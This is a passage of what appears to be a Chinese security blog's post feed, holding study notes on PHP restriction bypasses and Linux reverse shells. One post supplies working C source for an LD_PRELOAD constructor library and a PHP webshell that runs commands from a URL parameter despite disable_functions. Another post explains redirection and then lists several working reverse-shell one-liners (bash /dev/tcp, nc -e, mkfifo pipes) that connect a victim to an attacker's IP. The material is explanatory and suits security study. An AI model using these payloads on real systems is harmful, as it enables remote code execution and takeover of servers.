== $allowable_characters[$i]) &#123;</span><br><span class="line">            echo &quot;$i $i 0 $length &quot;;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bypass open_basedir</title>
      <link href="/2020/05/11/bypass-open-basedir/"/>
      <url>/2020/05/11/bypass-open-basedir/</url>
      
        <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedir的新方法</a><br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一些不包含数字和字母的webshell</title>
      <link href="/2020/05/11/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"/>
      <url>/2020/05/11/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a><br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></p><p> <a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777/article/details/104631142</a> </p><a id="more"></a><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">关于PHP正则的一些绕过方法)</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bypass_disable_functions</title>
      <link href="/2020/05/09/bypass-disable-functions/"/>
      <url>/2020/05/09/bypass-disable-functions/</url>
      
        <content type="html"><![CDATA[<p><a href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/" target="_blank" rel="noopener">bypass_disable_functions</a><br><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">LD_PRELOAD &amp; putenv() 绕过 disable_functions &amp; open_basedir</a><br><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p><a id="more"></a><h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b() 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，常见突破 disable_functions 限制执行操作系统命令的方式为：</p><ul><li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</li><li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；( LD_PRELOAD是Unix中的一个环境变量，用于定义在程序运行前优先加载的动态链接库，LD和动态库有关，PRELOAD表示预加载，结合起来就是预先加载的动态库。通过这个环境变量，可以覆盖正常的函数库中的函数。)</li><li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名 getuid() 所劫持；</li><li>达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</li></ul><h4 id="a-c文件："><a href="#a-c文件：" class="headerlink" title="a.c文件："></a>a.c文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">  int main(int argc,char **argv)&#123;</span><br><span class="line">  char passwd[]=&quot;123456&quot;;</span><br><span class="line">  </span><br><span class="line">  if(argc&lt;2)&#123;</span><br><span class="line">  printf(&quot;input password!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  if(!strcmp(passwd,argv[1]))&#123;</span><br><span class="line">  printf(&quot;Correct\n&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">  printf(&quot;Invalid\n&quot;);  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 如果是不知道密码的情况下，就可以编写一个动态函数库来覆盖掉strcmp函数恒返回0以达到任意密码都返回Correct </p><blockquote><p>-fPIC 作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)， 则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意 位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的</p></blockquote><h4 id="evil-c文件："><a href="#evil-c文件：" class="headerlink" title="evil.c文件："></a>evil.c文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int strcmp(const char *s1,const char *s2)&#123;</span><br><span class="line">    printf(&quot;evil function\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以绕过disable_functions,可以通过上传恶意so文件，劫持getuid(),达到命令执行目的。之所以劫持 getuid()，是因为 sendmail 程序会调用该函数（当然也可以为其他被调用的系统函数）</p><p>但是这种劫持函数的做法有很大的缺陷：</p><p> 一是，某些环境中，web 禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）</p><h4 id="C-语言扩展修饰符"><a href="#C-语言扩展修饰符" class="headerlink" title="C 语言扩展修饰符"></a>C 语言扩展修饰符</h4><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了</p><p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p><p>此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code></p><h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><p>PHP中putenv()函数用于设置服务器环境变量，仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure><p> 如 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(&quot;LD_PRELOAD=/tmp/evil.so&quot;);</span><br></pre></td></tr></table></figure><h4 id="bypass-c文件："><a href="#bypass-c文件：" class="headerlink" title="bypass.c文件："></a>bypass.c文件：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ; //获取环境变量</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">    //获取EVIL_CMDLINE的值</span><br><span class="line">    int i;</span><br><span class="line">    //从环境变量中遍历“LD_PRELOAD”的位置，并将其值设为NULL。</span><br><span class="line">    //从而使下面的system()正常执行。</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &apos;\0&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 执行命令</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure><h4 id="bypass-php"><a href="#bypass-php" class="headerlink" title="bypass.php:"></a>bypass.php:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); //设置EVIL_CMDLINE环境变量</span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);  //加载恶意动态库</span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);  //利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php一些正则绕过</title>
      <link href="/2020/05/09/php%E4%B8%80%E4%BA%9B%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
      <url>/2020/05/09/php%E4%B8%80%E4%BA%9B%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">关于PHP正则的一些绕过方法</a><br><a href="https://blog.csdn.net/qq_38783875/article/details/85288671" target="_blank" rel="noopener">preg_match函数，正则匹配绕过</a><br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux反弹shell</title>
      <link href="/2020/04/24/Linux%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2020/04/24/Linux%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a><br><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></p><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a><strong>文件描述符</strong></h2><blockquote><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p></blockquote><a id="more"></a><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p><p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h3><p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p><p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p><p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a><strong>重定向</strong></h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p><p>（1）输入重定向 &lt; &lt;&lt;<br>（2）输出重定向 &gt; &gt;&gt;</p><h3 id="重点："><a href="#重点：" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p><p>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p><p>3.&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</p><p><strong>4.再强调一下，重定向就是针对文件描述符的操作</strong></p><h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1.输入重定向"></a><strong>1.输入重定向</strong></h3><p>格式： [n]&lt; word <strong>（注意[n]与&lt;之间没有空格）</strong></p><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p><p> 解释: 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。(<strong>有没有觉得这个其实就是C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入</strong>) </p><h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2.输出重定向"></a><strong>2.输出重定向</strong></h3><p>格式： [n]&gt; word</p><p> 说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出） </p><h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3.标准输出与标准错误输出重定向"></a><strong>3.标准输出与标准错误输出重定向</strong></h3><p>格式： &amp;&gt; word &gt;&amp; word</p><p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的，详细的介绍后面会有)</p><h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a><strong>4.文件描述符的复制</strong></h3><p>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p><p>说明：</p><p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p><p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p><p>这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中</p><h3 id="重点：-1"><a href="#重点：-1" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p><p>(1)cmd &gt; file 2&gt;&amp;1<br>(2)cmd 2&gt;&amp;1 &gt;file</p><p>与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程</p><p><strong>1.首先解析器解析到 2&gt;&amp;1</strong></p><p> <strong>2.解析器再向后解析到 “&gt;”</strong> </p><h3 id="5-exec-绑定重定向"><a href="#5-exec-绑定重定向" class="headerlink" title="5.exec 绑定重定向"></a><strong>5.exec 绑定重定向</strong></h3><p>格式：exec [n] &lt;/&gt; file/[n]</p><p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p><h3 id="重点：-2"><a href="#重点：-2" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>格式： [n]&lt;&gt;word</p><p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p><h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a><strong>什么是反弹shell</strong></h2><p> reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。 </p><h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a><strong>为什么要反弹shell</strong></h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2.它的ip会动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><h2 id="反弹shell的本质是什么"><a href="#反弹shell的本质是什么" class="headerlink" title="反弹shell的本质是什么"></a><strong>反弹shell的本质是什么</strong></h2><p>我们就以最常见的bash为例：<br>attacker机器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>victim 机器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>可以看到在攻击机上出现了受害者机器的shell</p><p>解释一下这条命令具体的含义：</p><p><strong>1.bash -i</strong></p><p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p><p>2）-i 这个参数表示的是产生交互式的shell</p><p><strong>2./dev/tcp/ip/port</strong></p><p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。</p><p> 但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信 </p><p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上<br>在受害者机器上输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure><p> 任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。 </p><p>但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</p><p>于是我们似乎还需要一条这样的指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &lt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure><p> 现在我们需要将两条指令结合起来 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p> <strong>输入0是由/dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.156.129/2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong> </p><p> <strong>注意：</strong><br>但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决 </p><p><strong>4. &gt;&amp;、&amp;&gt;</strong></p><p>这个符号在我附上链接的那篇文章中也提到了，作用就是混合输出（错误、正确输出都输出到一个地方）</p><p>现在我们解决一下前面的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>当然我们也可以执行与之完全等价的指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p> bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。 </p><p>至此，我们的反弹shell的经典语句就分析完了，通过这条语句的分析我们能大致的了解反弹shell的本质，以后碰到其他的反弹shell 的语句也能用类似的分析方法区分析，甚至我们也可以自己举一反三创造更加绝妙的反弹shell 的语句**</p><h2 id="常见的反弹shell-的语句怎么理解"><a href="#常见的反弹shell-的语句怎么理解" class="headerlink" title="常见的反弹shell 的语句怎么理解"></a><strong>常见的反弹shell 的语句怎么理解</strong></h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a><strong>1.方法一</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure><p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别</p><h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3.方法三"></a><strong>3.方法三</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><p><strong>简单的解释一下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure><p>这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过），于是我们就能通过文件描述符对这个socket连接进行操作了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command|while read line do .....done</span><br></pre></td></tr></table></figure><p>这个是一个非常经典的句子，它的原句是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">       …</span><br><span class="line">done &lt; file</span><br></pre></td></tr></table></figure><p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p><p>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p><p>与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><h3 id="4-方法四"><a href="#4-方法四" class="headerlink" title="4.方法四"></a><strong>4.方法四</strong></h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.146.129 2333</span><br></pre></td></tr></table></figure><p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><strong>简单的解释：</strong></p><p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p><p>类似的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | 